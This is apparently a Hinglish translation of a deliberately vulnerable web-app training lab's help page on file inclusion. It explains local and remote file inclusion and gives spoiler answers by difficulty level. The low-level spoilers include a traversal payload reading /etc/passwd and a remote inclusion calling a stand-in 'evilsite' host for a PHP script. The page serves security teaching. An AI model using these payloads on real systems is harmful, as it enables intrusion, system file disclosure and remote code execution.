Help - File Inclusion

Parichay (About)

Kuch web applications user ko aisa input dene ki permission deti hain jo seedha file streams mein use hota hai ya user ko server par files upload karne deta hai. Kuch time baad web application web application ke context mein hi user ke diye gaye input ko access karti hai. Aisa karke, web application malicious file execution ka potential allow kar rahi hoti hai.

Agar jo file include karne ke liye chuni gayi hai woh target machine par local hai, toh ise "Local File Inclusion (LFI)" kehte hain. Par files doosri machines par bhi include ki ja sakti hain, us case mein attack "Remote File Inclusion (RFI)" ban jata hai.

Jab RFI ka option na ho, toh LFI ke sath koi doosri vulnerability (jaise file upload aur directory traversal) use karke aksar same effect achieve kiya ja sakta hai.

Note karein, "file inclusion" term ka matlab "arbitrary file access" ya "file disclosure" nahi hota.



Objective (lakshya)

Sirf file inclusion ka use karke '../hackable/flags/fi.php' se saare paanch famous quotes read karein.



Low Level

Yeh kai PHP functions mein se ek ke andar direct input allow karta hai jo execute hote time content ko include kar lega.

Web service ki configuration par depend karega ki RFI hona possible hai ya nahi.

Spoiler (jawab): LFI: ?page=../../../../../../etc/passwd.
			Spoiler (jawab): RFI: ?page=http://www.evilsite.com/evil.php.

Medium Level

Developer ne LFI/RFI ki kuch problems ke baare mein padh liya hai, aur input ko filter karne ka faisla kiya hai. Halanki, jo patterns use kiye gaye hain, woh sifficient nahi hain.

Spoiler (jawab): LFI: Possible, due to it only cycling through the pattern matching once.
			Spoiler (jawab): RFI: PHP Streams.

High Level

Developer tang aa chuka hai. Unhone sirf kuch specific files ko hi use karne dene ka faisla kiya hai. Halanki kyunki same basename wali multiple files hain, isliye woh sabhi ko include karne ke liye wildcard use karte hain.

Spoiler (jawab): LFI: The filename only has start with a certain value..
			Spoiler (jawab): RFI: Need to link in another vulnerability, such as file upload.

Impossible Level

Developer haar maan leta hai aur exact filenames ke sath sirf allowed pages ko hardcode kar deta hai. Aisa karke, woh attack ke saare raaste band kar deta hai.
